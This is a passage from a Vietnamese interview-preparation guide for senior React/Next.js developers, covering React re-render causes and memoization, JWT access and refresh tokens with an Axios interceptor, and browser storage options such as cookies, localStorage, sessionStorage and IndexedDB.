│     └─ Bỏ qua shouldComponentUpdate                             │
│                                                                  │
│  7. KEY THAY ĐỔI                                                │
│     └─ Key prop thay đổi → unmount + remount hoàn toàn          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

#### Chi tiết từng nguyên nhân:

**1. State thay đổi:**

```jsx
function Counter() {
  const [count, setCount] = useState(0);
  // Mỗi click → setCount → re-render
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}

// LƯU Ý: setState với cùng giá trị → KHÔNG re-render (bailout)
setCount(0); // Nếu count đang = 0 → không re-render
```

**2. Props thay đổi:**

```jsx
function Child({ name }) {
  return <div>{name}</div>; // name thay đổi → Child re-render
}
```

**3. Parent re-render (quan trọng!):**

```jsx
function Parent() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <button onClick={() => setCount(count + 1)}>+</button>
      {/* Child RE-RENDER dù không nhận count! */}
      <Child />
      {/* Fix bằng React.memo */}
      <MemoizedChild />
    </div>
  );
}

const MemoizedChild = React.memo(Child);
```

**4. Context thay đổi:**

```jsx
const ThemeContext = createContext("light");

function App() {
  const [theme, setTheme] = useState("light");

  return (
    // theme đổi → TẤT CẢ consumers re-render
    <ThemeContext.Provider value={theme}>
      <Header /> {/* re-render nếu dùng useContext */}
      <Content />
      <Footer />
    </ThemeContext.Provider>
  );
}
```

**5. Custom hooks internal state:**

```jsx
function useWindowSize() {
  const [size, setSize] = useState({ width: 0, height: 0 });

  useEffect(() => {
    const handleResize = () => {
      setSize({ width: window.innerWidth, height: window.innerHeight });
    };
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  return size;
}

function Component() {
  const size = useWindowSize(); // Resize window → re-render!
  return <div>{size.width}</div>;
}
```

**6. forceUpdate (Class component):**

```jsx
class MyComponent extends React.Component {
  handleClick = () => {
    this.forceUpdate(); // Bỏ qua shouldComponentUpdate
  };
}
```

**7. Key thay đổi:**

```jsx
function Parent() {
  const [id, setId] = useState(1);

  // Key đổi → Child UNMOUNT hoàn toàn + REMOUNT mới
  return <Child key={id} />;
}
```

---

### Cách ngăn Re-render không cần thiết

**1. React.memo:**

```jsx
const Child = React.memo(function Child({ data }) {
  return <div>{data}</div>;
});
// Chỉ re-render khi props thay đổi (shallow compare)
```

**2. useMemo cho values:**

```jsx
function Parent() {
  const [count, setCount] = useState(0);

  // Có useMemo: cùng reference → Child không re-render
  const config = useMemo(() => ({ theme: "dark" }), []);

  return <MemoizedChild config={config} />;
}
```

**3. useCallback cho functions:**

```jsx
function Parent() {
  // Có useCallback: cùng reference
  const handleClick = useCallback(() => console.log("click"), []);

  return <MemoizedChild onClick={handleClick} />;
}
```

**4. Children pattern:**

```jsx
function Parent({ children }) {
  const [count, setCount] = useState(0);

  return (
    <div>
      <button onClick={() => setCount(count + 1)}>+</button>
      {/* children không re-render vì được tạo ở level cao hơn */}
      {children}
    </div>
  );
}

// Usage
<Parent>
  <ExpensiveChild /> {/* Không re-render khi count đổi! */}
</Parent>;
```

**5. State colocation:**

```jsx
// ❌ State ở level cao → re-render nhiều components
function App() {
  const [inputValue, setInputValue] = useState("");
  return (
    <div>
      <Header /> {/* re-render khi inputValue đổi */}
      <Input value={inputValue} onChange={setInputValue} />
      <Footer />
    </div>
  );
}

// ✅ State ở level thấp → chỉ re-render component cần thiết
function App() {
  return (
    <div>
      <Header />
      <Input /> {/* state nằm trong đây */}
      <Footer />
    </div>
  );
}

function Input() {
  const [value, setValue] = useState(""); // State local
  return <input value={value} onChange={(e) => setValue(e.target.value)} />;
}
```

---

### Tóm tắt Lifecycle

| Phase   | Class Component                                     | Function Component                   |
| ------- | --------------------------------------------------- | ------------------------------------ |
| Mount   | constructor → render → componentDidMount            | useState init → function → useEffect |
| Update  | shouldComponentUpdate → render → componentDidUpdate | function chạy lại → useEffect        |
| Unmount | componentWillUnmount                                | useEffect cleanup                    |

### Tóm tắt Re-render

| Nguyên nhân         | Cách ngăn                           |
| ------------------- | ----------------------------------- |
| State thay đổi      | Chỉ update khi cần                  |
| Props thay đổi      | React.memo                          |
| Parent re-render    | React.memo, children pattern        |
| Context thay đổi    | Split context, use-context-selector |
| New object/function | useMemo, useCallback                |

---

## Quick Reference

### Event Loop Order

```
Sync → Microtasks (Promise) → Macrotasks (setTimeout)
```

### CSS Specificity (thấp → cao)

```
element < .class < #id < inline < !important
```

### React Performance

```
React.memo → Component
useMemo → Value
useCallback → Function reference
```

### script loading

```
<script>       → block parsing
<script async> → không đảm bảo thứ tự
<script defer> → đảm bảo thứ tự, sau DOM ready
```

---

## Q9: JWT Authentication - Access Token & Refresh Token

### 9.1 Tại sao cần 2 token?

**accessToken** giống như **thẻ ra vào công ty** - bạn quẹt thẻ để vào cửa, đi thang máy, vào phòng họp. Mỗi lần làm gì đều cần quẹt thẻ.

Vấn đề là nếu thẻ này bị mất hoặc bị copy, người khác có thể dùng nó để vào công ty của bạn. Nên công ty quy định: **thẻ chỉ có hiệu lực 15 phút - 1 tiếng**, hết hạn phải đổi thẻ mới.

Nhưng nếu cứ 15 phút lại bắt nhân viên ra lễ tân đổi thẻ (login lại) thì rất phiền. Nên công ty cấp thêm **refreshToken** - giống như **giấy xác nhận nhân viên** - bạn chỉ cần đưa giấy này là được cấp thẻ mới, không cần điền lại form đăng ký (không cần nhập lại username/password).

| Token | Thời hạn | Mục đích | Khi nào gửi |
|-------|----------|----------|-------------|
| accessToken | 15m - 1h | Xác thực mỗi request | Mọi API call |
| refreshToken | 7d - 30d | Lấy accessToken mới | Chỉ khi cần refresh |

### 9.2 Flow hoạt động

**Bước 1: Login**
- User nhập username/password
- Server verify đúng → trả về accessToken + refreshToken

**Bước 2: Gọi API bình thường**
- Mỗi request đều gắn accessToken vào header
- Server check token còn hạn → cho qua
- User không cảm nhận gì, mọi thứ smooth

**Bước 3: accessToken hết hạn**
- User gọi API → Server trả về lỗi 401
- **Magic xảy ra ở đây:**

**Bước 4: Tự động refresh (user không biết)**
1. Code frontend bắt được lỗi 401
2. Lấy refreshToken đang lưu
3. Gọi API `/refresh` để xin accessToken mới
4. Lưu accessToken mới
5. **Gọi lại request ban đầu** với token mới
6. User chỉ thấy: click → data hiện ra (không biết đằng sau vừa refresh)

**Bước 5: Khi nào mới đá ra login?**
- refreshToken cũng hết hạn (sau 7 ngày không dùng app)
- refreshToken bị revoke (logout ở thiết bị khác, admin block...)

### 9.3 Implementation với Axios Interceptors

```typescript
// api/axiosInstance.ts
import axios, { AxiosError, InternalAxiosRequestConfig } from 'axios';

const axiosInstance = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL,
});

// REQUEST INTERCEPTOR - Gắn token vào header
axiosInstance.interceptors.request.use(
  (config: InternalAxiosRequestConfig) => {
    const accessToken = localStorage.getItem('accessToken');
    if (accessToken) {
      config.headers.Authorization = `Bearer ${accessToken}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// RESPONSE INTERCEPTOR - Xử lý 401 và refresh
let isRefreshing = false;
let failedQueue: Array<{
  resolve: (token: string) => void;
  reject: (error: any) => void;
}> = [];

const processQueue = (error: any, token: string | null) => {
  failedQueue.forEach((prom) => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token!);
    }
  });
  failedQueue = [];
};

axiosInstance.interceptors.response.use(
  (response) => response,
  async (error: AxiosError) => {
    const originalRequest = error.config as InternalAxiosRequestConfig & {
      _retry?: boolean;
    };

    if (error.response?.status === 401 && !originalRequest._retry) {

      // Đang refresh → đưa vào queue chờ
      if (isRefreshing) {
        return new Promise((resolve, reject) => {
          failedQueue.push({
            resolve: (token: string) => {
              originalRequest.headers.Authorization = `Bearer ${token}`;
              resolve(axiosInstance(originalRequest));
            },
            reject: (err) => reject(err),
          });
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        const refreshToken = localStorage.getItem('refreshToken');
        const { data } = await axios.post('/api/auth/refresh', { refreshToken });

        localStorage.setItem('accessToken', data.accessToken);
        if (data.refreshToken) {
          localStorage.setItem('refreshToken', data.refreshToken);
        }

        originalRequest.headers.Authorization = `Bearer ${data.accessToken}`;
        processQueue(null, data.accessToken);
        return axiosInstance(originalRequest);

      } catch (refreshError) {
        processQueue(refreshError, null);
        localStorage.removeItem('accessToken');
        localStorage.removeItem('refreshToken');
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);

export default axiosInstance;
```

### 9.4 Race Condition - Tại sao cần Queue?

Tưởng tượng trang dashboard load cùng lúc 5 API, cả 5 đều nhận 401 **cùng một lúc**:

**Không có Queue:**
```
Request 1 thấy 401 → gọi refresh → được token mới ✓
Request 2 thấy 401 → gọi refresh → LỖI (refreshToken đã dùng rồi) ✗
Request 3, 4, 5 → cũng lỗi ✗
```
→ 4/5 request fail, user thấy lỗi lung tung

**Có Queue:**
```
Request 1 thấy 401 → đánh dấu "đang refresh" → gọi refresh
Request 2 thấy 401 → thấy đang refresh → đứng chờ trong hàng
Request 3, 4, 5 → cũng đứng chờ
Refresh xong → có token mới → retry tất cả request trong hàng
```
→ Tất cả 5 request đều thành công

### 9.5 Silent Refresh vs Proactive Refresh

| Loại | Cách hoạt động | Ưu điểm | Nhược điểm |
|------|----------------|---------|------------|
| **Silent (Reactive)** | Chờ bị 401 rồi mới refresh | Đơn giản, ít code | User có thể thấy delay nhỏ |
| **Proactive** | Check expiry trước khi gọi API, refresh sớm | Smooth hơn, không delay | Phải decode JWT để check exp |

```typescript
// Proactive: Check trước khi gọi API
import { jwtDecode } from 'jwt-decode';

const isTokenExpiringSoon = (token: string, bufferSeconds = 60): boolean => {
  const decoded = jwtDecode<{ exp: number }>(token);
  const currentTime = Date.now() / 1000;
  return decoded.exp - currentTime < bufferSeconds; // Còn < 60s
};
```

### 9.6 Câu hỏi phỏng vấn thường gặp

| Câu hỏi | Trả lời |
|---------|---------|
| **Tại sao cần 2 token?** | accessToken ngắn hạn giảm risk nếu bị leak. refreshToken dài hạn, chỉ gửi khi refresh, giảm exposure |
| **refreshToken lưu ở đâu?** | httpOnly cookie là best practice (không bị XSS). localStorage dễ dùng nhưng vulnerable với XSS |
| **Nếu refreshToken bị leak?** | Implement rotation (mỗi lần refresh trả về refreshToken mới), hoặc thêm device fingerprint |
| **Concurrent requests?** | Dùng queue + flag isRefreshing để tránh race condition |

---

## Q10: Browser Storage - localStorage, sessionStorage, Cookie, IndexedDB

### 10.1 So sánh tổng quan

| Storage | Dung lượng | Lifetime | Gửi lên Server | Truy cập |
|---------|------------|----------|----------------|----------|
| **Cookie** | ~4KB | Set được expiry | ✅ Tự động gửi mỗi request | Cả client & server |
| **localStorage** | ~5-10MB | Vĩnh viễn (đến khi clear) | ❌ Không tự động | Chỉ client |
| **sessionStorage** | ~5-10MB | Đến khi đóng tab | ❌ Không tự động | Chỉ client (chỉ tab đó) |
| **IndexedDB** | ~50MB - unlimited | Vĩnh viễn | ❌ Không tự động | Chỉ client |

### 10.2 Cookie - Chi tiết

**Đặc điểm:**
- **Tự động gửi** lên server mỗi request (cả hình ảnh, CSS, JS)
- Có thể set `httpOnly` → JavaScript không đọc được (chống XSS)
- Có thể set `secure` → chỉ gửi qua HTTPS
- Có thể set `SameSite` → chống CSRF

```javascript
// Set cookie từ client
document.cookie = "username=john; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/";

// Set cookie từ server (response header)
// Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict

// Đọc cookie (chỉ đọc được những cookie KHÔNG có httpOnly)
console.log(document.cookie); // "username=john; theme=dark"
```

**Khi nào dùng:**
- Authentication tokens (với httpOnly)
- Tracking, analytics
- Cần server đọc được mỗi request

### 10.3 localStorage - Chi tiết

**Đặc điểm:**
- Dữ liệu tồn tại vĩnh viễn đến khi user clear hoặc code xóa
- Chỉ lưu được **string** (phải JSON.stringify object)
- **Đồng bộ (synchronous)** - có thể block main thread nếu data lớn
- Share giữa tất cả tabs cùng origin

```javascript
// Lưu
localStorage.setItem('user', JSON.stringify({ name: 'John', age: 30 }));

// Đọc
const user = JSON.parse(localStorage.getItem('user'));

// Xóa
localStorage.removeItem('user');

// Xóa tất cả
localStorage.clear();

// Listen thay đổi từ tab khác
window.addEventListener('storage', (e) => {
  console.log('Key changed:', e.key);
  console.log('Old value:', e.oldValue);
  console.log('New value:', e.newValue);
});
```

**Khi nào dùng:**
- User preferences (theme, language)
- Cache data không nhạy cảm
- Draft content (form chưa submit)

**Không nên dùng cho:**
- Sensitive data (tokens nếu lo XSS)
- Data lớn (dùng IndexedDB)

### 10.4 sessionStorage - Chi tiết

**Đặc điểm:**
- Giống localStorage nhưng **chỉ tồn tại trong session** (đóng tab = mất)
- **Không share** giữa các tabs (mỗi tab có sessionStorage riêng)
- Mở tab mới (Ctrl+T) = sessionStorage trống
- Duplicate tab (Ctrl+Shift+T) = copy sessionStorage sang tab mới

```javascript
// Cú pháp giống hệt localStorage
sessionStorage.setItem('tempData', 'some value');
const data = sessionStorage.getItem('tempData');
```

**Khi nào dùng:**
- Data chỉ cần trong 1 session
- Form wizard (multi-step form)
- Sensitive data tạm thời (không muốn persist)

### 10.5 IndexedDB - Chi tiết (Hay bị hỏi!)

**Đặc điểm:**
- **NoSQL database** trong browser
- Lưu được **mọi kiểu data** (object, file, blob, array...)
- **Asynchronous** - không block main thread
- Dung lượng lớn (50MB - hàng GB)
- Hỗ trợ **transactions** và **indexes**
- Phức tạp hơn localStorage nhiều

```javascript
// Mở/tạo database
const request = indexedDB.open('MyDatabase', 1);

// Tạo schema khi version thay đổi
request.onupgradeneeded = (event) => {
  const db = event.target.result;

  // Tạo object store (như table)
  const store = db.createObjectStore('users', { keyPath: 'id' });

  // Tạo index để query nhanh
  store.createIndex('email', 'email', { unique: true });
  store.createIndex('age', 'age', { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;

  // Thêm data
  const transaction = db.transaction(['users'], 'readwrite');
  const store = transaction.objectStore('users');

  store.add({ id: 1, name: 'John', email: 'john@example.com', age: 30 });
  store.add({ id: 2, name: 'Jane', email: 'jane@example.com', age: 25 });

  // Đọc data
  const getRequest = store.get(1);
  getRequest.onsuccess = () => {
    console.log(getRequest.result); // { id: 1, name: 'John', ... }
  };

  // Query bằng index
  const index = store.index('age');
  const range = IDBKeyRange.bound(20, 30); // age từ 20-30
  index.openCursor(range).onsuccess = (e) => {
    const cursor = e.target.result;
    if (cursor) {
      console.log(cursor.value);
      cursor.continue();
    }
  };
};
```

**Wrapper libraries (dễ dùng hơn):**
```javascript
// Dexie.js - popular wrapper
import Dexie from 'dexie';

const db = new Dexie('MyDatabase');
db.version(1).stores({
  users: '++id, email, age' // ++id = auto increment
});

// CRUD đơn giản
await db.users.add({ name: 'John', email: 'john@example.com', age: 30 });
const user = await db.users.get(1);
const youngUsers = await db.users.where('age').below(30).toArray();
await db.users.update(1, { age: 31 });
await db.users.delete(1);
```

**Khi nào dùng IndexedDB:**
- Offline-first apps (PWA)
- Cache large datasets
- Lưu files/blobs (images, documents)
- Complex queries cần indexes
- Data quá lớn cho localStorage

### 10.6 So sánh Use Cases

| Use Case | Nên dùng | Lý do |
|----------|----------|-------|
| Auth token (secure) | httpOnly Cookie | Không bị XSS đọc được |
| Auth token (simple) | localStorage | Dễ implement, chấp nhận risk XSS |
| User preferences | localStorage | Persist across sessions |
| Form draft | sessionStorage | Mất khi đóng tab = không vấn đề |
| Offline data | IndexedDB | Dung lượng lớn, async |
| Large files cache | IndexedDB | Lưu được blob, không giới hạn 5MB |
| Shopping cart | localStorage | Persist, share across tabs |
| Multi-step form | sessionStorage | Không cần persist, chỉ cần trong session |

### 10.7 Câu hỏi phỏng vấn thường gặp

| Câu hỏi | Trả lời |
|---------|---------|
| **Cookie vs localStorage?** | Cookie gửi lên server mỗi request, có httpOnly. localStorage chỉ client-side, dung lượng lớn hơn |
| **localStorage vs sessionStorage?** | localStorage persist vĩnh viễn và share across tabs. sessionStorage mất khi đóng tab, mỗi tab riêng biệt |
| **Khi nào dùng IndexedDB?** | Data lớn, cần async, offline apps, lưu files, cần query phức tạp |
| **IndexedDB vs localStorage?** | IndexedDB async + dung lượng lớn + lưu mọi kiểu data. localStorage sync + 5MB + chỉ string |
| **Security concern của localStorage?** | XSS có thể đọc được. Nên dùng httpOnly cookie cho sensitive data |
| **Làm sao sync data giữa tabs?** | localStorage có storage event. Hoặc dùng BroadcastChannel API |

### 10.8 BroadcastChannel - Bonus (sync giữa tabs)

```javascript
// Tab 1: Gửi message
const channel = new BroadcastChannel('my-channel');
channel.postMessage({ type: 'USER_LOGGED_OUT' });

// Tab 2: Nhận message
const channel = new BroadcastChannel('my-channel');
channel.onmessage = (event) => {
  if (event.data.type === 'USER_LOGGED_OUT') {
    // Redirect to login
    window.location.href = '/login';
  }
};
```

---

_Interview Practice Summary_
_50 Questions for Senior React/Next.js Position_
